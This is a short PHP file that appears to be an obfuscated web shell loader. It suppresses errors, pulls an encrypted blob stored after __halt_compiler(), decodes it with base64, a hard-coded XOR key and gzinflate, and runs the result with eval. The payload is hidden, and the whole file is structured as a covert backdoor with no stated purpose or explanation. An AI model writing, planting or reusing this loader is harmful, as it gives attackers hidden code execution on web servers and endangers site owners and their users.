<?php
@error_reporting(0);
function xor_decipher($data, $key) {
    $keyLen = strlen($key);
    $output = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $output .= $data[$i] ^ $key[$i % $keyLen];
    }
    return $output;
}
$key = 'hajarbosku';
$payload = substr(file_get_contents(__FILE__), __COMPILER_HALT_OFFSET__);
$decoded_b64 = base64_decode($payload); 
$decrypted_xor = xor_decipher($decoded_b64, $key); 
$code = gzinflate($decrypted_xor);
eval('?>' . $code);
__halt_compiler();7TWjD6lSf85shVctb0LG40MExF14eEf7tMz4L+c1yETQR9BvM+9N9Jfczklb9kqyUa28iaf6C6Eo/c2cSYw2FNyefwBlRnLzJ3tUWk9/VU4/wfT1o0F5d9F0ieOsOaJG8VbKN2QUCGfj2f+J2+LZztXjlZsmv27m1om/shJu3n+oCzkhV4Rw2I0zkpjMSMPgm7m3A6rBgYpqn2CD0HbWi7h1UtRHHq8CO12HFJ0LeFW/Dk6aHu4qlqKxLmvA3yAHCjUz9kdQ6YcPfbghfbf/hQCdJNO/2OQL/SaAejeQb3d1od42WvtgG0NVx7bh4QjE+zdpOlbAu0BvQv2jp8yb5Zf0b+m5D9gH4G6PoKVP5Y8dctXD/GD75fvq/lLeMsJvviVTxMsSaym3c3fN6z1BsGOWHTUGpPavB/Ap35s2FnKFmzVKNOYLaaX8QOG9toQZtj6d1HKrZtQrXqHMVA2GE4OsDW9ARr2T5kbf1F9fGUrl3Mh+rG5oyqPFqOkAWjK4sfhDVXP4EgxNknSy0kltApIupd8khM3r0SL9Kh+H6yf0BgKmfzV0mDXbj07PXFX4GRsoecVIV+I/ptxUEu/Jqub4lE31kResHSOy2dqyhsyuh9zIt9fNmg2C3LSxHByIC5/6+nRPidhex8SHg6Fk30Xs/gfT09KwpwcmrUHiFBhfixBnqJ+M1tO7yNw/ME7J9iFHLUEi29EVW93LXk0ZBe1wv5DtF5AWpNFI4IY3lPueaOFBUID/dwhSJdka4dpvEDyireEFQgn4+9ekw65oaoYtfqnntcJhCBHQ8XEYSKeReQnDxS98hx1kOiCL6SnILC8YSQ7hvTHhng==